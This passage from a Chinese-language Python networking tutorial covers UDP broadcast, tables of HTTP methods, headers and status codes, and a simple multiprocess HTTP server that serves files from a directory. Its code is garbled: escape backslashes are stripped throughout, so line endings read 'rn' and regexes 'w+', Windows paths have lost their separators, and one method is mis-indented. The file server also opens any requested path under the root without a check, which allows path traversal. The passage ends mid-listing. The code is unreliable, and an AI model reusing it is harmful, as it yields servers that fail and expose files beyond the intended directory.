<span class="token comment">#value:设置选项的具体内容</span>
</code></pre> 
<p>如果要进行广播肯定要有广播的接收端，而接收端不一定可以接收到广播，但只要打开接收端就可以接收到广播</p> 
<pre><code class="prism language-python"><span class="token comment">#------------这是广播接收端----------</span>
<span class="token keyword">import</span> socket
BROADCAST_CLIENT_ADDR<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token number">21567</span><span class="token punctuation">)</span><span class="token comment">#客户端的绑定地址 当前主机</span>
SERVER_HOST<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token comment">#要连接的服务端的主机名称或ip地址</span>
SERVER_PORT<span class="token operator">=</span><span class="token number">8080</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span> <span class="token keyword">as</span> client_socket<span class="token punctuation">:</span><span class="token comment">#建立客户端socket</span>
        client_socket<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SO_BROADCAST<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#设置广播模式</span>
        client_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>BROADCAST_CLIENT_ADDR<span class="token punctuation">)</span><span class="token comment">#绑定广播客户端地址</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><span class="token comment">#不断进行接收</span>
            message<span class="token punctuation">,</span>iport<span class="token operator">=</span>client_socket<span class="token punctuation">.</span>recvfrom<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token comment">#接收广播信息</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'接收的消息内容为%s,消息来源%s,消息端口%s'</span><span class="token operator">%</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>iport<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>iport<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p>当客户端执行后就持续等待服务端消息的发送，就跟所有手机一样，如果手机没有待机的状态轮询服务器，那么就不可能接听电话或者短息。</p> 
<pre><code class="prism language-python"><span class="token comment">#-------------这是广播发送端--------</span>
<span class="token keyword">import</span> socket
BROADCAST_SERVER_ADDR<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'&lt;broadcast&gt;'</span><span class="token punctuation">,</span><span class="token number">21567</span><span class="token punctuation">)</span><span class="token comment">#设置广播地址</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#socket网络服务每一次处理完成之后一定要使用close()关闭，所以使用with结构定义</span>
    <span class="token comment">#socket.AF_INET ip4网络协议进行服务端创建</span>
    <span class="token comment">#socket.SOCK_DGRAM创建一个数据报协议的服务端(UDP)</span>
    <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span> <span class="token keyword">as</span> server_socket<span class="token punctuation">:</span><span class="token comment">#创建服务端Socket</span>
        server_socket<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SO_BROADCAST<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#设置广播模式</span>
        server_socket<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span><span class="token string">'这是广播发送端'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>BROADCAST_SERVER_ADDR<span class="token punctuation">)</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p>在进行广播处理的时候只需要设置一个《 broadcast》地址就可以实现广播的处理，而对于接收端而言则不能保证信息可以正常接收</p> 
<h1>
<a id="7HTTP_290"></a>7.HTTP</h1> 
<p>在标准的网络通信之中使用的是socket编程，而socket编程是对TCP/UDP协议进行抽象实现，在整个实现之中，可以清楚的发现，几乎不需要过多的考虑TCP/UDP实现细节，而后完全基于socket就可以非常简单的实现了</p> 
<p>但是socket编程本身会存在一个问题，就是必须提供两个程序端：客户端/服务端，服务端是整个网络编程的核心所在，但是如果每一次服务端的升级都需要进行客户端的强制更新，那么这种做法就会显得非常麻烦了，所以在传统网络编程的基础上就形成了HTTP协议（<em>是针对TCP协议的一种更高级的包装，TCP协议本身存有性能问题，所以HTTP实现也可能产生更大的性能问题，所以未来可能在UDP协议基础上实现HTTP协议</em>）。</p> 
<p>HTTP协议是一种应用在www万维网上实现数据传输的一种数据交互协议。客户端基于浏览器向服务器端发送HTTP服务请求，服务端会根据用户的请求进行数据文件的加载，并将要回应的数据信息以HTML文件格式进行传输，当浏览器接收到此数据信息时就可以直接进行代码的解析并将数据信息显示给用户浏览</p> 
<p>在整个的HTTP开发流程之中，最为重要的设计就放在HTML代码的编写上，对于WEB服务器开发者而言更为重要是清楚HTTP服务器的开发</p> 
<p>虽然HTTP是基于TCP协议基础之上开发的新协议，但其本质并没有脱离传统的TCP协议(可靠连接，数据交互)，随后在TCP协议的基础上扩充了HTTP自己的内容，就成为了新的协议，而这些内容实际上都是随着每一次请求和响应的头部信息来进行发送的<br> <img src="https://images2.imgbox.com/9e/8b/AOugjRMT_o.jpg" alt="在这里插入图片描述"><br> 在整个HTTP请求和响应的处理过程中，核心问题就在于：请求和响应的头部信息有哪些，响应状态码(HTTP服务请求之后的状态码是确定响应能否正确执行的关键部分)</p> 
<p>在HTTP协议之中，为了便于用户的请求，所以设计有多种请求模式（比较常见的就是get/post），对于一些流行的Restful设计的结构，有可能会进行这些不同模式的请求区分，随着HTTP版本的不断提升，请求的模式也在不断的增加</p> 
<table>
<thead><tr>
<th>No</th>
<th>方法</th>
<th>描述</th>
</tr></thead>
<tbody>
<tr>
<td>1</td>
<td>GET</td>
<td>请求指定的页面信息，并返回实体主体</td>
</tr>
<tr>
<td>2</td>
<td>HEAD</td>
<td>类似于get请求，只不过返回的响应中没有具体的内容，用于获取请求头部数据</td>
</tr>
<tr>
<td>3</td>
<td>POST</td>
<td>向指定的资源提交数据进行处理请求(例如提交表单或上传文件)</td>
</tr>
<tr>
<td>4</td>
<td>PUT</td>
<td>从客户端向服务器传输数据取代替指定文档的内容</td>
</tr>
<tr>
<td>5</td>
<td>DELETE</td>
<td>请求服务器删除指定的页面</td>
</tr>
<tr>
<td>6</td>
<td>CONNECT</td>
<td>HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器</td>
</tr>
<tr>
<td>7</td>
<td>OPTIONS</td>
<td>允许客户端查看服务器的性能</td>
</tr>
<tr>
<td>8</td>
<td>TRACE</td>
<td>回显服务器接收到的请求，主要用于测试或诊断</td>
</tr>
</tbody>
</table>
<p>在每一次客户端发送HTTP请求的时候除了真实的内容之外，还会包含有许多的头部信息</p> 
<table>
<thead><tr>
<th>No</th>
<th>头部信息</th>
<th>描述</th>
<th>实例</th>
</tr></thead>
<tbody>
<tr>
<td>1</td>
<td>Accept</td>
<td>设置客户端显示类型</td>
<td>Accept: text/html,application</td>
</tr>
<tr>
<td>2</td>
<td>Accept-Encoding</td>
<td>设置浏览器可以支持的压缩编码类型</td>
<td>Accept-Encoding: gzip, deflate, br</td>
</tr>
<tr>
<td>3</td>
<td>Accept-Language</td>
<td>浏览器可接受的语言</td>
<td>Accept-Language: zh-CN,zh;q=0.9</td>
</tr>
<tr>
<td>4</td>
<td>Cookie</td>
<td>将客户端保存的数据发送到服务器</td>
<td>Cookie:name=lsf</td>
</tr>
<tr>
<td>5</td>
<td>Content-Length</td>
<td>请求内容的长度</td>
<td>Content-Length:348</td>
</tr>
<tr>
<td>6</td>
<td>Content-Type</td>
<td>请求与实体对应的MIME信息</td>
<td></td>
</tr>
<tr>
<td>7</td>
<td>HOST</td>
<td>请求主机</td>
<td>HOST:www.baidu.com</td>
</tr>
<tr>
<td>8</td>
<td>Referer</td>
<td>访问来路</td>
<td>Referer:https://www.baidu.com.html</td>
</tr>
</tbody>
</table>
<p>服务器能否正常运行，还有一个关键性的问题，就是服务器端对于请求的响应编码回应</p> 
<table>
<thead><tr>
<th>分类</th>
<th>描述</th>
</tr></thead>
<tbody>
<tr>
<td>1**</td>
<td>信息，服务器接收到请求，需要请求者继续执行操作</td>
</tr>
<tr>
<td>2**</td>
<td>成功，操作被成功接收并处理</td>
</tr>
<tr>
<td>3**</td>
<td>重定向，需要进一步的操作以完成请求</td>
</tr>
<tr>
<td>4**</td>
<td>客户端错误，请求包含语法错误或无法完成请求</td>
</tr>
<tr>
<td>5**</td>
<td>服务器错误，服务器在处理请求的过程中发送了错误</td>
</tr>
</tbody>
</table>
<p>在每一次HTTP服务器响应的时候实际也存在各种头信息，这些头信息实际上就是告诉浏览器该如何解释代码</p> 
<table>
<thead><tr>
<th>No</th>
<th>头信息</th>
<th>描述</th>
</tr></thead>
<tbody>
<tr>
<td>1</td>
<td>Content-Encoding</td>
<td>返回压缩编码类型</td>
</tr>
<tr>
<td>2</td>
<td>Content-Language</td>
<td>响应内容支持的语言</td>
</tr>
<tr>
<td>3</td>
<td>Content-Length</td>
<td>响应内容的长度</td>
</tr>
<tr>
<td>4</td>
<td>Content-Type</td>
<td>响应数据的MIME类型</td>
</tr>
<tr>
<td>5</td>
<td>Last-Modified</td>
<td>请求资源的最后修改时间</td>
</tr>
<tr>
<td>6</td>
<td>Location</td>
<td>重定向路径</td>
</tr>
<tr>
<td>7</td>
<td>refersh</td>
<td>资源定时刷新配置</td>
</tr>
<tr>
<td>8</td>
<td>Server</td>
<td>web服务器软件名称</td>
</tr>
<tr>
<td>9</td>
<td>Set-Cookie</td>
<td>设置Http C ookie</td>
</tr>
</tbody>
</table>
<h1>
<a id="8HTTP_347"></a>8.HTTP响应</h1> 
<p>在HTTP编程之中核心的本质依旧是进行请求和响应，只不过这个响应处理数据之外还需包含头信息，这些内容一定要被浏览器进行解析，浏览器在进行请求的时候需要依据服务器的主机名称和访问端口进行请求的发送，<br> 所有的HTTP服务器一定要通过浏览器进行访问，服务器绑定在本机的80端口上，那么就可直接进行本地服务访问，浏览器输入：http://localhost</p> 
<pre><code class="prism language-python"><span class="token comment">#---------------http基础服务端---------</span>
<span class="token keyword">import</span> socket <span class="token comment">#http是基于TCP协议，所以一定使用socket</span>
<span class="token keyword">import</span> multiprocessing <span class="token comment">#考虑到性能问题，为每一次请求开启一个新的进程</span>
<span class="token keyword">class</span>   <span class="token class-name">HttpServer</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''服务器的程序类'''</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#服务器要有一个监听的端口</span>
        self<span class="token punctuation">.</span>server_socket<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token comment">#创建socket实例</span>
        <span class="token comment">#考虑到不同系统的问题，80端口是一个必争端口，该端口属于系统的核心端口，所以将核心任务与核心端口绑定</span>
        self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#绑定核心端口</span>
        self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#启动监听</span>
    <span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">'''服务器开始提供服务'''</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><span class="token comment">#持续提供服务</span>
            cli_socket<span class="token punctuation">,</span>iport<span class="token operator">=</span>self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#接收客户端请求</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'新的客户端连接，客户端ip:%s,客户端端口:%s'</span><span class="token operator">%</span><span class="token punctuation">(</span>iport<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>iport<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#输出客户端信息</span>
            <span class="token comment">#将客户端都设置为一个独立的进程存在 都分别进行请求的回应</span>
            handle_cli_process<span class="token operator">=</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>self<span class="token punctuation">.</span>handle_response<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>cli_socket<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            handle_cli_process<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#进程启动</span>
    <span class="token keyword">def</span> <span class="token function">handle_response</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>cli_socket<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">'''对每一个指定的客户端进行响应'''</span>
        request_headers<span class="token operator">=</span>cli_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token comment">#用户通过浏览器发送的请求本身就携带头信息</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'客户端请求头信息:%s'</span><span class="token operator">%</span>request_headers<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#输入用户请求头信息</span>
        response_start_line<span class="token operator">=</span><span class="token string">'HTTP/1.1 200 OK'</span><span class="token comment">#本次的响应成功</span>
        response_headers<span class="token operator">=</span><span class="token string">'Server: wph ServerrnContent-Type:text/htmlrn'</span><span class="token comment">#可以添加更多的响应头信息</span>
        response_body<span class="token operator">=</span>  <span class="token string">'&lt;html&gt;'</span>
                        <span class="token string">' &lt;head&gt;'</span>
                        <span class="token string">'       &lt;title&gt;测试&lt;/title&gt;'</span>
                        <span class="token string">' &lt;meta charset="UTF-8"/&gt;'</span>
                        <span class="token string">' &lt;/head&gt;'</span>
                        <span class="token string">'&lt;body&gt;'</span>
                        <span class="token string">'   &lt;h1&gt;测试页面&lt;/h1&gt;'</span>
                        <span class="token string">'&lt;/body&gt;'</span>
                        <span class="token string">'&lt;/html&gt;'</span>
        response<span class="token operator">=</span>response_start_line<span class="token operator">+</span>response_headers<span class="token operator">+</span><span class="token string">'rn'</span><span class="token operator">+</span>response_body<span class="token comment">#最终的响应内容</span>
        cli_socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#服务端响应</span>
        cli_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#HTTP不保留用户状态，所以每次处理后都断开连接，否则会造成性能开支，且这些开支是无意义的</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    http_server<span class="token operator">=</span>HttpServer<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token comment">#80为服务器的默认端口，可以不用输入，直接输入域名即可</span>
    http_server<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#开启服务</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<h1>
<a id="9_397"></a>9.建立响应目录</h1> 
<p>如果html代码以字符串的形式出现在整个Python程序里面，那么这样的HTML代码是很难被前端进行维护的，前端需要的是一个可以进行响应的处理目录，相当于建立一个专属的html响应代码目录，而后所有要响应的内容都要保存在此目录之中</p> 
<pre><code class="prism language-python"><span class="token comment">#---------------http基础服务端---------</span>
<span class="token keyword">import</span> socket <span class="token comment">#http是基于TCP协议，所以一定使用socket</span>
<span class="token keyword">import</span> re
<span class="token keyword">import</span> os <span class="token comment">#进行文件路径的定义</span>
<span class="token comment">#os.getcwd() 当前文件的根目录  os.sep </span>
HTML_ROOT_DIR<span class="token operator">=</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>os<span class="token punctuation">.</span>sep<span class="token comment">#响应目录</span>
<span class="token keyword">import</span> multiprocessing <span class="token comment">#考虑到性能问题，为每一次请求开启一个新的进程</span>
<span class="token keyword">class</span>   <span class="token class-name">HttpServer</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''服务器的程序类'''</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#服务器要有一个监听的端口</span>
        self<span class="token punctuation">.</span>server_socket<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token comment">#创建socket实例</span>
        <span class="token comment">#考虑到不同系统的问题，80端口是一个必争端口，该端口属于系统的核心端口，所以将核心任务与核心端口绑定</span>
        self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#绑定核心端口</span>
        self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#启动监听</span>
    <span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">'''服务器开始提供服务'''</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><span class="token comment">#持续提供服务</span>
            cli_socket<span class="token punctuation">,</span>iport<span class="token operator">=</span>self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#接收客户端请求</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'新的客户端连接，客户端ip:%s,客户端端口:%s'</span><span class="token operator">%</span><span class="token punctuation">(</span>iport<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>iport<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#输出客户端信息</span>
            <span class="token comment">#将客户端都设置为一个独立的进程存在 都分别进行请求的回应</span>
            handle_cli_process<span class="token operator">=</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>self<span class="token punctuation">.</span>handle_response<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>cli_socket<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            handle_cli_process<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#进程启动</span>
    <span class="token keyword">def</span> <span class="token function">handle_response</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>cli_socket<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">'''对每一个指定的客户端进行响应'''</span>
        request_headers<span class="token operator">=</span>cli_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token comment">#用户通过浏览器发送的请求本身就携带头信息</span>
        <span class="token comment">#使用正则提取请求头信息</span>
        file_name<span class="token operator">=</span>re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">r'w+ +(/[^ ]*)'</span><span class="token punctuation">,</span>request_headers<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'rn'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token comment"># file_name=request_headers.decode().split(' ',2)[1]</span>
        <span class="token keyword">if</span> file_name<span class="token operator">==</span><span class="token string">'/'</span><span class="token punctuation">:</span>
            file_name<span class="token operator">=</span> <span class="token string">'wenjian/index.html'</span>  <span class="token comment">#为根目录</span>
        <span class="token keyword">if</span> file_name<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.wenjian'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> file_name<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.htm'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            cli_socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span>self<span class="token punctuation">.</span>get_html_data<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#服务端响应</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment">#二进制图表内容</span>
            cli_socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span>self<span class="token punctuation">.</span>get_binary_data<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#响应二进制数据</span>
        cli_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#HTTP不保留用户状态，所以每次处理后都断开连接，否则会造成性能开支，且这些开支是无意义的</span>
    <span class="token keyword">def</span> <span class="token function">read_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>file_name<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#读文件数据</span>
        file_path<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>normpath<span class="token punctuation">(</span>HTML_ROOT_DIR<span class="token operator">+</span>file_name<span class="token punctuation">)</span><span class="token comment">#文件的完整路径</span>
        <span class="token builtin">file</span><span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token comment">#采用二进制流的形式读取</span>
        file_data<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#读取文件内容</span>
        <span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> file_data <span class="token comment">#返回读取的数据</span>
    <span class="token keyword">def</span> <span class="token function">get_binary_data</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>file_name<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#二进制文件的读取</span>
        response_body<span class="token operator">=</span>self<span class="token punctuation">.</span>read_file<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
        <span class="token keyword">return</span> response_body
    <span class="token keyword">def</span> <span class="token function">get_html_data</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>file_name<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#读取指定文件</span>
         response_start_line <span class="token operator">=</span> <span class="token string">'HTTP/2 200 OKrn'</span>
        <span class="token comment"># 响应头</span>
        response_headers <span class="token operator">=</span> <span class="token string">'Server PWS/2.0rn'</span>  <span class="token comment"># 可以添加更多的响应头信息</span>
        response_body <span class="token operator">=</span>self<span class="token punctuation">.</span>read_file<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#设置响应内容</span>
        response <span class="token operator">=</span> response_start_line <span class="token operator">+</span> response_headers <span class="token operator">+</span> <span class="token string">'rn'</span> <span class="token operator">+</span> response_body  <span class="token comment"># 最终的响应内容</span>
        <span class="token keyword">return</span> response
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    http_server<span class="token operator">=</span>HttpServer<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token comment">#80为服务器的默认端口，可以不用输入，直接输入域名即可</span>
    http_server<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#开启服务</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<h1>
<a id="10_459"></a>10.动态请求处理</h1> 
<p>对于web开发来说，分为两个处理阶段：静态web处理，动态web处理，在之前设置的响应目录实际上就是属于静态web处理，而动态web是可以进行动态的判断来决定最终返回的数据内容。</p> 
<pre><code class="prism language-python"><span class="token comment">#---------------http基础服务端---------</span>
<span class="token keyword">import</span> socket <span class="token comment">#http是基于TCP协议，所以一定使用socket</span>
<span class="token keyword">import</span> re
<span class="token keyword">import</span> os <span class="token comment">#进行文件路径的定义</span>
<span class="token keyword">import</span> sys <span class="token comment">#模块加载定位</span>
sys<span class="token punctuation">.</span>path<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'page'</span><span class="token punctuation">)</span><span class="token comment">#追加模块加载路径</span>
<span class="token comment">#os.getcwd() 当前文件的根目录  os.sep </span>
<span class="token comment"># HTML_ROOT_DIR=os.getcwd()+os.sep#响应目录</span>
<span class="token comment"># HTML_ROOT_DIR=r'F:pythonstudypython-Study静态Web服务器搭建wenjianstatic'#响应目录</span>
HTML_ROOT_DIR<span class="token operator">=</span><span class="token string">r'F:pythonstudypython-Study静态Web服务器搭建wenjian'</span><span class="token comment">#响应目录</span>
<span class="token keyword">import</span> multiprocessing <span class="token comment">#考虑到性能问题，为每一次请求开启一个新的进程</span>
<span class="token keyword">class</span>   <span class="token class-name">HttpServer</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''服务器的程序类'''</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#服务器要有一个监听的端口</span>
        self<span class="token punctuation">.</span>server_socket<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token comment">#创建socket实例</span>
        <span class="token comment">#考虑到不同系统的问题，80端口是一个必争端口，该端口属于系统的核心端口，所以将核心任务与核心端口绑定</span>
        self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#绑定核心端口</span>
